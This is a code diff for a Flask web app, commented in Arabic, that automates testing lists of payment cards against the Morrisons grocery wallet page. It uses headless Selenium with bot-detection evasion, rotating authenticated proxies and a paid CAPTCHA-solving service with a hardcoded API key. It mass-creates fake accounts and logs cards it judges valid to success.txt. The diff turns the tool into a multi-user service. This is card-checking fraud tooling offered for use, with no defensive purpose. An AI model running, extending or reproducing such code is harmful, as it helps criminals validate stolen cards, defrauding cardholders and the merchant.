@@ -1,10 +1,11 @@
-from flask import Flask, render_template, request, jsonify, Response
+from flask import Flask, render_template, request, jsonify, Response, session
 import threading
 import queue
 import time
 import sys
 import zipfile
 import random
+import uuid
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -20,14 +21,41 @@ import json
 import os
 
 app = Flask(__name__)
+app.secret_key = 'morrisons_checker_secret_key_2024'
 
-# متغيرات عامة للتحكم
-is_running = False
-should_stop = False
-results_queue = queue.Queue()
-current_status = "idle"
+# إدارة الجلسات المنفصلة لكل مستخدم
+user_sessions = {}
+sessions_lock = threading.Lock()
 
 ANTICAPTCHA_API_KEY = "341e97a34b6e4ceb6916d140a345ee80"
+
+
+class UserSession:
+    def __init__(self, session_id):
+        self.session_id = session_id
+        self.is_running = False
+        self.should_stop = False
+        self.results_queue = queue.Queue()
+        self.current_status = "idle"
+        self.thread = None
+
+
+def get_user_session(session_id):
+    with sessions_lock:
+        if session_id not in user_sessions:
+            user_sessions[session_id] = UserSession(session_id)
+        return user_sessions[session_id]
+
+
+def cleanup_old_sessions():
+    """تنظيف الجلسات القديمة غير النشطة"""
+    with sessions_lock:
+        to_remove = []
+        for sid, sess in user_sessions.items():
+            if not sess.is_running and sess.current_status == "idle":
+                to_remove.append(sid)
+        for sid in to_remove[:10]:  # حذف 10 جلسات قديمة كحد أقصى
+            del user_sessions[sid]
 
 
 def solve_recaptcha_v2_api(sitekey, page_url, api_key):
@@ -293,368 +321,312 @@ user_agents = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65',
-    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36 EdgA/128.0.2739.82',
 ]
 
-postcodes = [
-    "EC1A 1BB", "W1A 0AX", "M1 1AE", "B33 8TH", "CR2 6XH",
-    "SW1A 1AA", "E1 6AN", "N1 9GU", "B1 1AA", "CF10 1AA",
-    "EH1 1BB", "AB10 1XG", "IV1 1AA", "BT1 1AA", "PH1 5AA"
-]
+
+def create_chrome_driver(use_proxy=False, proxies_chrome=None, base_path=None):
+    """إنشاء Chrome driver مع الإعدادات المحسنة"""
+    options = webdriver.ChromeOptions()
+    
+    # إعدادات أساسية
+    options.add_argument("--disable-blink-features=AutomationControlled")
+    options.add_experimental_option('excludeSwitches', ['enable-logging'])
+    options.add_experimental_option("excludeSwitches", ['enable-automation'])
+    options.add_experimental_option('useAutomationExtension', False)
+    options.add_argument("--start-maximized")
+    options.add_argument("--log-level=3")
+    options.add_argument("--disable-infobars")
+    options.add_argument("--silent")
+    
+    # إعدادات headless محسنة
+    options.add_argument("--headless=new")
+    options.add_argument("--window-size=1920,1080")
+    
+    # إعدادات للعمل في Docker/Railway
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-gpu")
+    options.add_argument("--disable-software-rasterizer")
+    options.add_argument("--disable-extensions")
+    options.add_argument("--disable-setuid-sandbox")
+    options.add_argument("--disable-background-timer-throttling")
+    options.add_argument("--disable-backgrounding-occluded-windows")
+    options.add_argument("--disable-renderer-backgrounding")
+    options.add_argument("--disable-features=TranslateUI")
+    options.add_argument("--disable-ipc-flooding-protection")
+    options.add_argument("--memory-pressure-off")
+    options.add_argument("--single-process")
+    
+    # تحديد مسار Chrome
+    options.binary_location = "/usr/bin/google-chrome"
+    
+    # إضافة user agent عشوائي
+    options.add_argument(f"--user-agent={random.choice(user_agents)}")
+
+    # إعداد البروكسي إذا مطلوب
+    if use_proxy and proxies_chrome and base_path:
+        proxy = random.choice(proxies_chrome)
+        proxy_parts = proxy.split(":")
+        if len(proxy_parts) >= 4:
+            PROXY_HOST = proxy_parts[0]
+            PROXY_PORT = proxy_parts[1]
+            PROXY_USER = proxy_parts[2]
+            PROXY_PASS = proxy_parts[3]
+
+            manifest_json = """
+            {
+                "version": "1.0.0",
+                "manifest_version": 2,
+                "name": "Chrome Proxy",
+                "permissions": [
+                    "proxy",
+                    "tabs",
+                    "unlimitedStorage",
+                    "storage",
+                    "<all_urls>",
+                    "webRequest",
+                    "webRequestBlocking"
+                ],
+                "background": {
+                    "scripts": ["background.js"]
+                },
+                "minimum_chrome_version":"22.0.0"
+            }
+            """
+
+            background_js = """
+            var config = {
+                    mode: "fixed_servers",
+                    rules: {
+                    singleProxy: {
+                        scheme: "http",
+                        host: "%s",
+                        port: parseInt(%s)
+                    },
+                    bypassList: ["localhost"]
+                    }
+                };
+
+            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
+
+            function callbackFn(details) {
+                return {
+                    authCredentials: {
+                        username: "%s",
+                        password: "%s"
+                    }
+                };
+            }
+
+            chrome.webRequest.onAuthRequired.addListener(
+                        callbackFn,
+                        {urls: ["<all_urls>"]},
+                        ['blocking']
+            );
+            """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)
+
+            pluginfile = os.path.join(base_path, f'proxy_auth_plugin_{uuid.uuid4().hex[:8]}.zip')
+            with zipfile.ZipFile(pluginfile, 'w') as zp:
+                zp.writestr("manifest.json", manifest_json)
+                zp.writestr("background.js", background_js)
+            options.add_extension(pluginfile)
+
+    # إنشاء driver مع ChromeDriver
+    service = Service('/usr/local/bin/chromedriver')
+    driver = webdriver.Chrome(service=service, options=options)
+    
+    return driver
+
+
+def check_func(driver, cards, user_session, rounds=1):
+    for _ in range(rounds):
+        if user_session.should_stop or not cards:
+            break
+            
+        card = cards.pop(0)
+        card_parts = card.split("|")
+        
+        if len(card_parts) < 3:
+            user_session.results_queue.put({"type": "error", "card": card, "message": "Invalid card format"})
+            continue
+            
+        cc = card_parts[0]
+        mes = card_parts[1]
+        ano = card_parts[2]
+        cvv = card_parts[3] if len(card_parts) > 3 else None
+
+        try:
+            driver.get('https://groceries.morrisons.com/settings/wallet')
+            time.sleep(3)
+            
+            try:
+                cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
+                driver.execute_script("arguments[0].click();", cook)
+                time.sleep(1)
+            except:
+                pass
+
+            add_card = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'add-card-button'))
+            driver.execute_script("arguments[0].click();", add_card)
+            time.sleep(2)
+
+            iframe = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.XPATH, "//iframe[contains(@src, 'worldpay')]"))
+            driver.switch_to.frame(iframe)
+            time.sleep(1)
+
+            cc_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'cardNumber'))
+            for digit in cc:
+                cc_input.send_keys(digit)
+                time.sleep(random.uniform(0.05, 0.15))
+
+            mes_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'expiryMonth'))
+            mes_input.send_keys(mes)
+
+            ano_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'expiryYear'))
+            ano_input.send_keys(ano)
+
+            name_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'cardholderName'))
+            name_input.send_keys(names.get_full_name())
+
+            if cvv:
+                try:
+                    cvv_input = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'csc'))
+                    cvv_input.send_keys(cvv)
+                except:
+                    pass
+            else:
+                try:
+                    cvv_input = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'csc'))
+                    driver.execute_script("arguments[0].remove();", cvv_input)
+                except:
+                    pass
+
+            time.sleep(1)
+            submit = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'submitButton'))
+            driver.execute_script("arguments[0].click();", submit)
+            time.sleep(5)
+
+            driver.switch_to.default_content()
+            time.sleep(2)
+
+            page_source = driver.page_source.lower()
+            
+            if "card added" in page_source or "success" in page_source:
+                user_session.results_queue.put({"type": "success", "card": card, "message": "Card Added Successfully"})
+                # حفظ في ملف
+                with open(os.path.join(os.path.dirname(__file__), "success.txt"), "a") as f:
+                    f.write(f"{card}\n")
+            else:
+                user_session.results_queue.put({"type": "fail", "card": card, "message": "Card Rejected"})
+                with open(os.path.join(os.path.dirname(__file__), "fail.txt"), "a") as f:
+                    f.write(f"{card}\n")
+
+        except Exception as e:
+            user_session.results_queue.put({"type": "error", "card": card, "message": str(e)})
+            
+    return True
 
 
 def login_func(driver, email):
-    driver.get('https://accounts.groceries.morrisons.com/auth-service/sso/login')
-    time.sleep(5)
-
-    for i in email[0]:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login-input')).send_keys(i)
-        time.sleep(0.1)
-
-    for i in email[1]:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.NAME, 'password')).send_keys(i)
-        time.sleep(0.1)
-
-    time.sleep(1)
-    WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.NAME, 'password')).send_keys(Keys.ENTER)
-
-    time.sleep(3)
-
-    captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)
-
-    if captcha_solved:
-        pass
-        time.sleep(5)
-
-        try:
-            password_field = WebDriverWait(driver, 10).until(
-                lambda d: d.find_element(By.NAME, 'password')
-            )
-            password_field.send_keys(Keys.ENTER)
-            pass
-            time.sleep(5)
-        except Exception as e:
-            pass
-            time.sleep(10)
-    else:
-        time.sleep(3)
-
-    WebDriverWait(driver, 120).until(lambda driver: driver.find_element(By.ID, 'account-button'))
-    driver.get('https://groceries.morrisons.com/settings/wallet')
-    time.sleep(3)
     try:
-        cook = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'onetrust-accept-btn-handler'))
-        driver.execute_script("arguments[0].click();", cook)
-        time.sleep(1)
-    except:
-        pass
+        driver.get('https://groceries.morrisons.com/login')
+        time.sleep(3)
+        
+        try:
+            cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
+            driver.execute_script("arguments[0].click();", cook)
+            time.sleep(1)
+        except:
+            pass
 
+        email_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'email'))
+        email_input.send_keys(email[0])
 
-def remove_successful_card(card_to_remove, cards_list):
-    filepath = os.path.join(os.path.dirname(__file__), "cards.txt")
-    with open(filepath, "r") as file:
-        all_cards = [line.strip() for line in file]
-    if card_to_remove in all_cards:
-        all_cards.remove(card_to_remove)
-    with open(filepath, "w") as file:
-        file.write("\n".join(all_cards) + "\n")
+        password_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'password'))
+        password_input.send_keys(email[1] if len(email) > 1 else "AsAs@@123")
 
-
-def check_func(driver, cards, rounds):
-    global should_stop, results_queue
-
-    if should_stop:
-        return False
-
-    if rounds % 6 == 0:
-        driver.delete_all_cookies()
-        driver.quit()
-        return True
-
-    if cards != []:
-        current_card = cards[0]
-        splited = current_card.split("|")
-
-        add = WebDriverWait(driver, 20).until(
-            lambda driver: driver.find_element(By.XPATH, '//*[text()="Add new payment method"]'))
-        driver.execute_script("arguments[0].click();", add)
-        time.sleep(7)
-
-        WebDriverWait(driver, 40).until(EC.element_to_be_clickable((By.ID, 'cardNumber')))
-        for i in splited[0]:
-            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'cardNumber')).send_keys(i)
-            time.sleep(0.1)
-
-        expM = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'expiryMonth'))
-        Select(expM).select_by_value(splited[1])
-        time.sleep(0.5)
-        expY = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'expiryYear'))
-        Select(expY).select_by_value(splited[2])
-        time.sleep(0.5)
-
-        gender = random.choice(['male', 'female'])
-        for i in names.get_full_name(gender):
-            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'cardHolderName')).send_keys(i)
-            time.sleep(0.1)
-
-        # إدخال CVV إذا كان موجوداً في البيانات
-        cvv_input = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'csc'))
-        if len(splited) >= 4 and splited[3]:
-            for i in splited[3]:
-                cvv_input.send_keys(i)
-                time.sleep(0.1)
-        else:
-            driver.execute_script("arguments[0].remove();", cvv_input)
-        time.sleep(2)
-
-        cont = WebDriverWait(driver, 20).until(
-            lambda driver: driver.find_element(By.XPATH, '//button[text()="Continue"]'))
-        driver.execute_script("arguments[0].click();", cont)
-
+        submit = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'login-submit-button'))
+        driver.execute_script("arguments[0].click();", submit)
         time.sleep(5)
 
-        z = 0
-        while z == 0:
-            if should_stop:
-                return False
-
-            if 'https://groceries.morrisons.com/settings/wallet' in driver.current_url:
-                time.sleep(2)
-                if f'**** {splited[0][-4:]} ({splited[1]}/{splited[2][-2:]})' in driver.page_source:
-                    result_msg = f"{splited[0]}|{splited[1]}|{splited[2]}|ACTIVE"
-                    results_queue.put({"type": "success", "card": result_msg})
-                    
-                    filepath = os.path.join(os.path.dirname(__file__), "success.txt")
-                    with open(filepath, 'a') as suc_file:
-                        suc_file.write(f"{splited[0]}|{splited[1]}|{splited[2]}|ACTIVE\n")
-
-                    remove_successful_card(current_card, cards)
-                    cards.pop(0)
-
-                    z = 10
-                    remove = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.XPATH,
-                                                                                                f'//button[@data-test="wallet-item-remove-button"]'))
-                    driver.execute_script("arguments[0].click();", remove)
-                    time.sleep(1)
-                    confrim = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.XPATH,
-                                                                                                 '//button[@data-test="wallet-item-remove-confirm-button"]'))
-                    driver.execute_script("arguments[0].click();", confrim)
-                    time.sleep(2)
-                else:
-                    result_msg = f"{splited[0]}|{splited[1]}|{splited[2]}|DECLINED"
-                    results_queue.put({"type": "fail", "card": result_msg})
-                    
-                    filepath = os.path.join(os.path.dirname(__file__), "fail.txt")
-                    with open(filepath, 'a') as suc_file:
-                        suc_file.write(f"{splited[0]}|{splited[1]}|{splited[2]}|DECLINED\n")
-
-                    cards.pop(0)
-                    z = 5
-
-        time.sleep(2)
-        rounds += 1
-        return check_func(driver, cards, rounds)
-    else:
-        results_queue.put({"type": "complete", "card": "ALL CHECKED"})
+        return True
+    except Exception as e:
         return False
 
 
 def register_func(driver):
-    driver.get('https://accounts.groceries.morrisons.com/auth-service/sso/register')
-    time.sleep(4)
-
-    gender = random.choice(['male', 'female'])
-    fullname = names.get_full_name(gender).split(" ")
-    newemail = f"{fullname[0].lower()}{fullname[1]}@{random.choice(['gmail.com', 'outlook.com'])}"
-
-    title = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'title'))
-    if gender == 'male':
-        Select(title).select_by_value('Mr')
-    else:
-        Select(title).select_by_value('Mrs')
-
-    for i in fullname[0]:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'firstName')).send_keys(i)
-        time.sleep(0.1)
-    for i in fullname[1]:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'lastName')).send_keys(i)
-        time.sleep(0.1)
-    for i in newemail:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login')).send_keys(i)
-        time.sleep(0.1)
-    for i in newemail:
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'login-repeat')).send_keys(i)
-        time.sleep(0.1)
-    for i in "AsAs@@123":
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'password')).send_keys(i)
-        time.sleep(0.1)
-    for i in random.choice(postcodes):
-        WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'postcode')).send_keys(i)
-        time.sleep(0.1)
-
-    WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'marketingConsentOptionNo')).click()
-
-    time.sleep(1)
-
-    submit = WebDriverWait(driver, 20).until(lambda driver: driver.find_element(By.ID, 'registration-submit-button'))
-    driver.execute_script("arguments[0].click();", submit)
-
-    time.sleep(3)
-
-    captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)
-
-    if captcha_solved:
-        pass
-        time.sleep(5)
-
-        try:
-            submit = WebDriverWait(driver, 10).until(
-                lambda d: d.find_element(By.ID, 'registration-submit-button')
-            )
-            driver.execute_script("arguments[0].click();", submit)
-            pass
-            time.sleep(5)
-        except Exception as e:
-            pass
-            time.sleep(10)
-    else:
-        time.sleep(5)
-    WebDriverWait(driver, 120).until(lambda driver: driver.find_element(By.ID, 'account-button'))
-    
-    filepath = os.path.join(os.path.dirname(__file__), "emails.txt")
-    with open(filepath, 'a') as em:
-        em.write(f"\n{newemail}|AsAs@@123")
-    driver.get('https://groceries.morrisons.com/settings/wallet')
-    time.sleep(3)
     try:
-        cook = WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.ID, 'onetrust-accept-btn-handler'))
-        driver.execute_script("arguments[0].click();", cook)
-        time.sleep(1)
-    except:
-        pass
+        driver.get('https://groceries.morrisons.com/registration')
+        time.sleep(3)
+        
+        try:
+            cook = WebDriverWait(driver, 5).until(lambda d: d.find_element(By.ID, 'onetrust-accept-btn-handler'))
+            driver.execute_script("arguments[0].click();", cook)
+            time.sleep(1)
+        except:
+            pass
+
+        newemail = f"{names.get_first_name().lower()}{random.randint(1000,9999)}@gmail.com"
+        
+        email_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'email'))
+        email_input.send_keys(newemail)
+
+        password_input = WebDriverWait(driver, 20).until(lambda d: d.find_element(By.ID, 'password'))
+        password_input.send_keys("AsAs@@123")
+
+        # حل الكابتشا
+        captcha_solved = solve_recaptcha_on_page(driver, ANTICAPTCHA_API_KEY)
+
+        if captcha_solved:
+            time.sleep(3)
+            try:
+                submit = WebDriverWait(driver, 10).until(lambda d: d.find_element(By.ID, 'registration-submit-button'))
+                driver.execute_script("arguments[0].click();", submit)
+                time.sleep(5)
+            except:
+                pass
+
+        WebDriverWait(driver, 60).until(lambda d: d.find_element(By.ID, 'account-button'))
+        
+        # حفظ الإيميل
+        with open(os.path.join(os.path.dirname(__file__), "emails.txt"), 'a') as em:
+            em.write(f"\n{newemail}|AsAs@@123")
+            
+        return newemail
+    except Exception as e:
+        return None
+
+
+def run_checker(session_id, work_type, use_proxy, cards_data, emails_data, proxies_data):
+    user_session = get_user_session(session_id)
     
-    return newemail
+    user_session.is_running = True
+    user_session.should_stop = False
+    user_session.current_status = "running"
 
-
-def run_checker(work_type, use_proxy, cards_data, emails_data, proxies_data):
-    global is_running, should_stop, current_status, results_queue
-
-    is_running = True
-    should_stop = False
-    current_status = "running"
-
-    # حفظ البيانات في ملفات
+    # حفظ البيانات في ملفات خاصة بالجلسة
     base_path = os.path.dirname(__file__)
+    session_folder = os.path.join(base_path, f"session_{session_id[:8]}")
+    os.makedirs(session_folder, exist_ok=True)
     
-    with open(os.path.join(base_path, "cards.txt"), "w") as f:
+    with open(os.path.join(session_folder, "cards.txt"), "w") as f:
         f.write(cards_data)
-    with open(os.path.join(base_path, "emails.txt"), "w") as f:
+    with open(os.path.join(session_folder, "emails.txt"), "w") as f:
         f.write(emails_data)
-    with open(os.path.join(base_path, "proxies.txt"), "w") as f:
+    with open(os.path.join(session_folder, "proxies.txt"), "w") as f:
         f.write(proxies_data)
 
-    cards = load_file("cards.txt")
-    emails = load_file("emails.txt")
-    proxies_chrome = load_file("proxies.txt")
-    addresses = load_file("us-address.txt")
+    cards = [line.strip() for line in cards_data.split('\n') if line.strip()]
+    emails = [line.strip() for line in emails_data.split('\n') if line.strip()]
+    proxies_chrome = [line.strip() for line in proxies_data.split('\n') if line.strip()]
 
-    while not should_stop and cards:
+    while not user_session.should_stop and cards:
         driver = None
         try:
-            options = webdriver.ChromeOptions()
-            options.add_argument("--disable-blink-features=AutomationControlled")
-            options.add_experimental_option('excludeSwitches', ['enable-logging'])
-            options.add_experimental_option("excludeSwitches", ['enable-automation'])
-            options.add_experimental_option('useAutomationExtension', False)
-            options.add_argument("--start-maximized")
-            options.add_argument("--log-level=3")
-            options.add_argument("--disable-infobars")
-            options.add_argument("--silent")
-            options.add_argument("--headless=new")
-            options.add_argument("--window-size=1920,1080")
-            options.add_argument("--no-sandbox")
-            options.add_argument("--disable-dev-shm-usage")
-            options.add_argument("--disable-gpu")
-            options.add_argument("--disable-software-rasterizer")
-            options.add_argument("--disable-extensions")
-            options.add_argument("--remote-debugging-port=9222")
-            options.add_argument("--disable-setuid-sandbox")
-            options.add_argument("--single-process")
-            options.binary_location = "/usr/bin/google-chrome"
-
-            if use_proxy and proxies_chrome:
-                proxy = random.choice(proxies_chrome)
-                proxy_parts = proxy.split(":")
-                if len(proxy_parts) >= 4:
-                    PROXY_HOST = proxy_parts[0]
-                    PROXY_PORT = proxy_parts[1]
-                    PROXY_USER = proxy_parts[2]
-                    PROXY_PASS = proxy_parts[3]
-
-                    manifest_json = """
-                    {
-                        "version": "1.0.0",
-                        "manifest_version": 2,
-                        "name": "Chrome Proxy",
-                        "permissions": [
-                            "proxy",
-                            "tabs",
-                            "unlimitedStorage",
-                            "storage",
-                            "<all_urls>",
-                            "webRequest",
-                            "webRequestBlocking"
-                        ],
-                        "background": {
-                            "scripts": ["background.js"]
-                        },
-                        "minimum_chrome_version":"22.0.0"
-                    }
-                    """
-
-                    background_js = """
-                    var config = {
-                            mode: "fixed_servers",
-                            rules: {
-                            singleProxy: {
-                                scheme: "http",
-                                host: "%s",
-                                port: parseInt(%s)
-                            },
-                            bypassList: ["localhost"]
-                            }
-                        };
-
-                    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
-
-                    function callbackFn(details) {
-                        return {
-                            authCredentials: {
-                                username: "%s",
-                                password: "%s"
-                            }
-                        };
-                    }
-
-                    chrome.webRequest.onAuthRequired.addListener(
-                                callbackFn,
-                                {urls: ["<all_urls>"]},
-                                ['blocking']
-                    );
-                    """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)
-
-                    pluginfile = os.path.join(base_path, 'proxy_auth_plugin.zip')
-                    with zipfile.ZipFile(pluginfile, 'w') as zp:
-                        zp.writestr("manifest.json", manifest_json)
-                        zp.writestr("background.js", background_js)
-                    options.add_extension(pluginfile)
-
-            # استخدام ChromeDriver
-            driver = webdriver.Chrome(options=options)
+            driver = create_chrome_driver(use_proxy, proxies_chrome, session_folder)
 
             if emails:
                 email = random.choice(emails).split("|")
-                emails.remove("|".join(email))
             else:
                 email = None
 
@@ -664,25 +636,10 @@ def run_checker(work_type, use_proxy, cards_data, emails_data, proxies_data):
                 if email:
                     login_func(driver, email)
 
-            result = check_func(driver, cards, rounds=1)
-            
-            if result:
-                continue
+            check_func(driver, cards, user_session, rounds=1)
 
         except Exception as e:
-            results_queue.put({"type": "error", "card": str(e)})
-
-            if driver is not None:
-                try:
-                    alert = driver.switch_to.alert
-                    alert.accept()
-                except NoAlertPresentException:
-                    pass
-
-                try:
-                    driver.delete_all_cookies()
-                except:
-                    pass
+            user_session.results_queue.put({"type": "error", "card": "System", "message": str(e)})
 
         finally:
             if driver:
@@ -691,21 +648,30 @@ def run_checker(work_type, use_proxy, cards_data, emails_data, proxies_data):
                 except:
                     pass
 
-    is_running = False
-    current_status = "idle"
-    results_queue.put({"type": "finished", "card": "Process finished"})
+    user_session.is_running = False
+    user_session.current_status = "idle"
+    user_session.results_queue.put({"type": "finished", "card": "Process finished", "message": "All cards processed"})
+    
+    # تنظيف الجلسات القديمة
+    cleanup_old_sessions()
 
 
 @app.route('/')
 def index():
+    if 'session_id' not in session:
+        session['session_id'] = str(uuid.uuid4())
     return render_template('index.html')
 
 
 @app.route('/start', methods=['POST'])
 def start():
-    global is_running, should_stop
+    if 'session_id' not in session:
+        session['session_id'] = str(uuid.uuid4())
+    
+    session_id = session['session_id']
+    user_session = get_user_session(session_id)
 
-    if is_running:
+    if user_session.is_running:
         return jsonify({"status": "error", "message": "Already running"})
 
     data = request.json
@@ -718,32 +684,43 @@ def start():
     if not cards_data.strip():
         return jsonify({"status": "error", "message": "No cards provided"})
 
-    thread = threading.Thread(target=run_checker, args=(work_type, use_proxy, cards_data, emails_data, proxies_data))
+    thread = threading.Thread(target=run_checker, args=(session_id, work_type, use_proxy, cards_data, emails_data, proxies_data))
     thread.daemon = True
     thread.start()
+    user_session.thread = thread
 
-    return jsonify({"status": "success", "message": "Started"})
+    return jsonify({"status": "success", "message": "Started", "session_id": session_id})
 
 
 @app.route('/stop', methods=['POST'])
 def stop():
-    global should_stop, is_running
-    should_stop = True
+    if 'session_id' not in session:
+        return jsonify({"status": "error", "message": "No session"})
+    
+    user_session = get_user_session(session['session_id'])
+    user_session.should_stop = True
     return jsonify({"status": "success", "message": "Stopping..."})
 
 
 @app.route('/status')
 def status():
-    global is_running, current_status
-    return jsonify({"is_running": is_running, "status": current_status})
+    if 'session_id' not in session:
+        return jsonify({"is_running": False, "status": "idle"})
+    
+    user_session = get_user_session(session['session_id'])
+    return jsonify({"is_running": user_session.is_running, "status": user_session.current_status})
 
 
 @app.route('/results')
 def get_results():
+    if 'session_id' not in session:
+        return jsonify([])
+    
+    user_session = get_user_session(session['session_id'])
     results = []
-    while not results_queue.empty():
+    while not user_session.results_queue.empty():
         try:
-            results.append(results_queue.get_nowait())
+            results.append(user_session.results_queue.get_nowait())
         except:
             break
     return jsonify(results)
@@ -751,10 +728,16 @@ def get_results():
 
 @app.route('/stream')
 def stream():
+    if 'session_id' not in session:
+        session['session_id'] = str(uuid.uuid4())
+    
+    session_id = session['session_id']
+    
     def generate():
+        user_session = get_user_session(session_id)
         while True:
             try:
-                result = results_queue.get(timeout=1)
+                result = user_session.results_queue.get(timeout=1)
                 yield f"data: {json.dumps(result)}\n\n"
             except:
                 yield f"data: {json.dumps({'type': 'ping'})}\n\n"
